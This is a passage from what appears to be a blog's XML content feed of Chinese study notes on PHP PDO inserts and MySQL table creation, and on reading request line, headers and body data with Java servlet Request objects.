class="line"><span class="php">mysqli_close($conn);</span></span><br></pre></td></tr></table></figure></p>
<p>PDO<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$servername = <span class="string">"localhost"</span>;</span></span><br><span class="line"><span class="php">$username = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$password = <span class="string">"root"</span>;</span></span><br><span class="line"><span class="php">$dbname = <span class="string">"myDB"</span>;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="php">    $conn = <span class="keyword">new</span> PDO(<span class="string">"mysql:host=$servername;dbname=$dbname"</span>, $username, $password);</span></span><br><span class="line"><span class="php">    <span class="comment">// 设置 PDO 错误模式，用于抛出异常</span></span></span><br><span class="line"><span class="php">    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span></span><br><span class="line">    $sql = "INSERT INTO MyGuests (firstname, lastname, email)</span><br><span class="line"><span class="php">    VALUES (<span class="string">'John'</span>, <span class="string">'Doe'</span>, <span class="string">'john@example.com'</span>)<span class="string">";</span></span></span><br><span class="line"><span class="php">    <span class="comment">// 使用 exec() ，没有结果返回 </span></span></span><br><span class="line"><span class="php">    $conn-&gt;exec($sql);</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"新记录插入成功"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">catch</span>(PDOException $e)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $sql . <span class="string">"&lt;br&gt;"</span> . $e-&gt;getMessage();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> </span></span><br><span class="line"><span class="php">$conn = <span class="keyword">null</span>;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
<li>PHP 中 SQL 查询语句必须使用引号</li>
<li>在 SQL 查询语句中的字符串值必须加引号</li>
<li>数值的值不需要引号</li>
<li>NULL 值不需要引号</li>
</ol>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>PHP开发</category>
        <category>基础</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaWeb-2020/7/23-Request-1</title>
    <url>/2020/07/23/JavaWeb-2020-7-23-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h1><h2 id="Reuqest原理"><a href="#Reuqest原理" class="headerlink" title="Reuqest原理"></a>Reuqest原理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;</span><br><span class="line">        System.out.println(&quot;service...&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>tomcat服务器会根据请求url中的资源路径，创建对应的ServletDemo1的对象</p>
</li>
<li><p>tomcat服务器，会创建request和response对象，request对象中封装请求消息数据</p>
</li>
<li><p>tomcat将request和response两个对象传递给service方法，并且调用service方法</p>
</li>
<li><p>程序员可以通过request对象来获取请求消息数据，可以通过response对象来设置响应消息数据</p>
</li>
<li><p>服务器在给浏览器做出响应之前，会从response对象中拿程序员设置的响应消息数据</p>
</li>
</ol>
<h3 id="request与response对象"><a href="#request与response对象" class="headerlink" title="request与response对象"></a>request与response对象</h3><ol>
<li><p>request和response对象是由服务器创建的。程序员使用它们</p>
</li>
<li><p>request对象是来获取请求消息，response对象是来设置响应消息</p>
</li>
</ol>
<h2 id="继承体系结构"><a href="#继承体系结构" class="headerlink" title="继承体系结构"></a>继承体系结构</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Get(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当访问时就会输出request对象</p>
<p>运行结果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">org</span><span class="selector-class">.apache</span><span class="selector-class">.catalina</span><span class="selector-class">.connector</span><span class="selector-class">.RequestFacade</span>@<span class="keyword">799ee87</span></span><br></pre></td></tr></table></figure><br>可以看到是apache包下的对象，@后是hash值</p>
<p>体系结构为：</p>
<ul>
<li><p>ServletRequest —接口</p>
</li>
<li><p>HttpServletRequest —接口</p>
</li>
<li><p>org.apache.catalina.connector.RequestFacade 类(tomcat)</p>
</li>
</ul>
<h2 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h2><p>获取请求消息数据可以有</p>
<ul>
<li><p>获取请求行数据</p>
</li>
<li><p>获取请求头数据</p>
</li>
<li><p>获取请求体数据</p>
</li>
</ul>
<h3 id="获取请求行数据"><a href="#获取请求行数据" class="headerlink" title="获取请求行数据"></a>获取请求行数据</h3><p>例如<br>GET /day14/demo3?name=51nd0re1 HTTP/1.1</p>
<h4 id="请求方式为-GET"><a href="#请求方式为-GET" class="headerlink" title="请求方式为 GET"></a>请求方式为 GET</h4><p>使用<code>String getMethod()</code>方法来获取</p>
<h4 id="获取虚拟目录-day14"><a href="#获取虚拟目录-day14" class="headerlink" title="*获取虚拟目录(/day14)"></a>*获取虚拟目录(/day14)</h4><p>使用<code>String getContextPath()</code>方法来获取</p>
<h4 id="获取Servlet路径-demo3"><a href="#获取Servlet路径-demo3" class="headerlink" title="获取Servlet路径(/demo3)"></a>获取Servlet路径(/demo3)</h4><p>使用<code>String getServletPath()</code>方法来获取</p>
<h4 id="获取get方式的请求参数-name-51nd0re1"><a href="#获取get方式的请求参数-name-51nd0re1" class="headerlink" title="获取get方式的请求参数(name=51nd0re1)"></a>获取get方式的请求参数(name=51nd0re1)</h4><p>使用<code>String getQueryString()</code>方法来获取</p>
<h4 id="获取请求URI-day14-demo3"><a href="#获取请求URI-day14-demo3" class="headerlink" title="*获取请求URI(/day14/demo3)"></a>*获取请求URI(/day14/demo3)</h4><p>使用<code>String getRequestURI()</code>方法来获取</p>
<p>还有一个获取URL的方法<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">String getRequestURL()</span><br><span class="line"></span><br><span class="line">返回结果为</span><br><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/day14/</span>demo3</span><br></pre></td></tr></table></figure></p>
<h4 id="获取协议及版本"><a href="#获取协议及版本" class="headerlink" title="获取协议及版本"></a>获取协议及版本</h4><p>使用<code>String getProtocol()</code>方法来获取</p>
<h4 id="获取客户机IP地址"><a href="#获取客户机IP地址" class="headerlink" title="获取客户机IP地址"></a>获取客户机IP地址</h4><p>使用<code>String getRemoteAddr()</code>方法来获取</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">package Request;</span><br><span class="line"></span><br><span class="line">import javax.servlet.ServletException;</span><br><span class="line">import javax.servlet.annotation.WebServlet;</span><br><span class="line">import javax.servlet.http.HttpServlet;</span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @author 51nd0re1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@<span class="constructor">WebServlet(<span class="params">name</span> = <span class="string">"RequestDemo1"</span>,<span class="params">urlPatterns</span> = <span class="string">"/request1"</span>)</span></span><br><span class="line">public <span class="keyword">class</span> RequestDemo1 extends HttpServlet &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Post(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"POST"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    protected void <span class="keyword">do</span><span class="constructor">Get(HttpServletRequest <span class="params">request</span>, HttpServletResponse <span class="params">response</span>)</span> throws ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//1.获取请求方法</span></span><br><span class="line">        String <span class="keyword">method</span>=request.get<span class="constructor">Method()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="keyword">method</span>);</span><br><span class="line">        <span class="comment">//2.获取虚拟目录</span></span><br><span class="line">        String context = request.get<span class="constructor">ContextPath()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(context);</span><br><span class="line">        <span class="comment">//3.获取Servletl路径</span></span><br><span class="line">        String servletPath = request.get<span class="constructor">ServletPath()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(servletPath);</span><br><span class="line">        <span class="comment">//4.获取get方式请求参数</span></span><br><span class="line">        String queryString = request.get<span class="constructor">QueryString()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(queryString);</span><br><span class="line">        <span class="comment">//5.获取请求URI/URL</span></span><br><span class="line">        String requestURI = request.get<span class="constructor">RequestURI()</span>;</span><br><span class="line">        StringBuffer requestURL = request.get<span class="constructor">RequestURL()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(requestURI);</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(requestURL);</span><br><span class="line">        <span class="comment">//6.获取版本</span></span><br><span class="line">        String protocal = request.get<span class="constructor">Protocol()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(protocal);</span><br><span class="line">        <span class="comment">//7.获取客户机IP</span></span><br><span class="line">        String remoteAddr = request.get<span class="constructor">RemoteAddr()</span>;</span><br><span class="line">        <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(remoteAddr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问<a href="http://localhost:8080/hello/request1?name=51nd0re1" target="_blank" rel="noopener">http://localhost:8080/hello/request1?name=51nd0re1</a></p>
<p>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">/hello</span><br><span class="line">/request1</span><br><span class="line">name=<span class="number">51</span>nd0re1</span><br><span class="line">/hello/request1</span><br><span class="line">http:<span class="comment">//localhost:8080/hello/request1</span></span><br><span class="line">HTTP/<span class="number">1.1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">0</span>:<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<h3 id="获取请求头数据"><a href="#获取请求头数据" class="headerlink" title="获取请求头数据"></a>获取请求头数据</h3><figure class="highlight plain"><figcaption><span>getHeader(String name)```</span></figcaption><table><tr><td class="code"><pre><span class="line">通过请求头的名称获取请求头的值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;Enumeration&lt;String&gt; getHeaderNames()</span><br></pre></td></tr></table></figure>
<p>获取所有的请求头名称</p>
<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>访问之后<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">Enumeration</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo2"</span>,urlPatterns = <span class="string">"/request2"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo2</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//1.获取所有请求头名称</span></span><br><span class="line">        <span class="type">Enumeration</span>&lt;<span class="type">String</span>&gt; headerNames = request.getHeaderNames();</span><br><span class="line">        <span class="comment">//2.遍历</span></span><br><span class="line">        <span class="keyword">while</span>(headerNames.hasMoreElements())&#123;</span><br><span class="line">            <span class="type">String</span> name = headerNames.nextElement();</span><br><span class="line">            <span class="comment">//根据名称获取请求头的值</span></span><br><span class="line">           <span class="type">String</span> value = request.getHeader(name);</span><br><span class="line">           <span class="type">System</span>.out.println(name+<span class="string">"---"</span>+value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">host<span class="comment">---localhost:8080</span></span><br><span class="line"><span class="keyword">user</span>-agent<span class="comment">---Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0</span></span><br><span class="line">accept<span class="comment">---text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line">accept-<span class="keyword">language</span><span class="comment">---zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line">accept-<span class="keyword">encoding</span><span class="comment">---gzip, deflate</span></span><br><span class="line"><span class="keyword">connection</span><span class="comment">---keep-alive</span></span><br><span class="line">cookie<span class="comment">---JSESSIONID=C4074C701516CDB3FA95402652CB489D; Phpstorm-d069594e=0d583fa6-ad80-4735-a385-c10cee7ee32f</span></span><br><span class="line">upgrade-insecure-requests<span class="comment">---1</span></span><br></pre></td></tr></table></figure></p>
<p>如果想要获取单个头信息，使用getHeader()就行</p>
<p>例如获取user-agent<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo3"</span>,urlPatterns = <span class="string">"/request3"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//获取user-agent</span></span><br><span class="line">        <span class="type">String</span> <span class="type">UA</span> = request.getHeader(<span class="string">"user-agent"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(<span class="type">UA</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">78.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">78.0</span></span><br></pre></td></tr></table></figure></p>
<p>还可以借此来判断浏览器<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo3"</span>,urlPatterns = <span class="string">"/request3"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo3</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//获取user-agent</span></span><br><span class="line">        <span class="type">String</span> <span class="type">UA</span> = request.getHeader(<span class="string">"user-agent"</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="type">UA</span>.contains(<span class="string">"Chrome"</span>))&#123;</span><br><span class="line">            <span class="type">System</span>.out.println(<span class="string">"Chrome浏览器"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="type">UA</span>.contains(<span class="string">"Firefox"</span>))&#123;</span><br><span class="line">            <span class="type">System</span>.out.println(<span class="string">"Firefox浏览器"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这样就可以判断出是什么浏览器访问的</p>
<p>可以使用referer来防盗链<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo4"</span>,urlPatterns = <span class="string">"/request4"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo4</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="type">String</span> referer = request.getHeader(<span class="string">"referer"</span>);</span><br><span class="line">        <span class="type">System</span>.out.println(referer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(referer != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(referer.contains(<span class="string">"/hello"</span>))&#123;</span><br><span class="line">                <span class="type">System</span>.out.println(<span class="string">"安全访问"</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="type">System</span>.out.println(<span class="string">"不安全访问"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如果直接访问就会输出null</p>
<p>需要通过连接来访问，则运行结果</p>
<p><img src="/img/JavaWeb/7-23学习日记/0.png" alt="avatar"></p>
<p>点击访问之后，运行结果<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost:<span class="number">8080</span><span class="regexp">/hello/g</span>et.html</span><br><span class="line">安全访问</span><br></pre></td></tr></table></figure></p>
<h3 id="获取请求体数据"><a href="#获取请求体数据" class="headerlink" title="获取请求体数据"></a>获取请求体数据</h3><p>请求体只有POST请求方式才会有请求体，在请求体中封装了POST请求的请求参数</p>
<p>步骤：</p>
<ol>
<li>获取流对象 </li>
<li>再从流对象中拿对象</li>
</ol>
<h4 id="获取流对象"><a href="#获取流对象" class="headerlink" title="获取流对象"></a>获取流对象</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BufferedReader </span>getReader()：获取字符输入流，只能操作字符数据</span><br></pre></td></tr></table></figure>
<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">ServletInputStream</span> <span class="function"><span class="title">getInputStream</span>():获取字节输入流，可以操作所有类型数据</span></span><br></pre></td></tr></table></figure>
<p>创建regist.html<br><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/hello/request5"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"注册"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过这个regist.html访问<br><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> <span class="type">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.<span class="type">ServletException</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.<span class="type">WebServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServlet</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletRequest</span>;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.<span class="type">HttpServletResponse</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">BufferedReader</span>;</span><br><span class="line"><span class="keyword">import</span> java.io.<span class="type">IOException</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet</span>(name = <span class="string">"RequestDemo5"</span>,urlPatterns = <span class="string">"/request5"</span>)</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">RequestDemo5</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> void doPost(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line">        <span class="comment">//获取请求消息体--请求参数</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.获取字符流</span></span><br><span class="line">        <span class="type">BufferedReader</span> br=request.getReader();</span><br><span class="line">        <span class="comment">//2.读取数据</span></span><br><span class="line">        <span class="type">String</span> line = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = br.readLine())!= <span class="literal">null</span> )&#123;</span><br><span class="line">            <span class="type">System</span>.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> void doGet(<span class="type">HttpServletRequest</span> request, <span class="type">HttpServletResponse</span> response) <span class="keyword">throws</span> <span class="type">ServletException</span>, <span class="type">IOException</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>运行结果<br><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">username=<span class="number">51</span>nd0re1&amp;password=<span class="number">123</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Java开发</category>
        <category>JavaWeb</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-2020/7/22-基础20</title>
    <url>/2020/07/22/PHP-2020-7-22-%E5%AD%A6%E4%B9%A0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="创建MySQL表"><a href="#创建MySQL表" class="headerlink" title="创建MySQL表"></a>创建MySQL表</h1><p>数据库中需要有表，使用create table语句在MySQL中创建表</p>
<p>在创建表前，需要使用use databasename 来选择操作的数据库</p>
<h2 id="使用-MySQLi-和-PDO-创建-MySQL-表"><a href="#使用-MySQLi-和-PDO-创建-MySQL-表" class="headerlink" title="使用 MySQLi 和 PDO 创建 MySQL 表"></a>使用 MySQLi 和 PDO 创建 MySQL 表</h2><p>在MySQL中创建数据表的格式为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> myDB;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> MyGuests (</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">INT</span>(<span class="number">6</span>) <span class="keyword">UNSIGNED</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">    firstname <span class="built_in">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    lastname <span class="built_in">VARCHAR</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    email <span class="built_in">VARCHAR</span>(<span class="number">50</span>),</span><br><span class="line">    reg_date <span class="built_in">TIMESTAMP</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
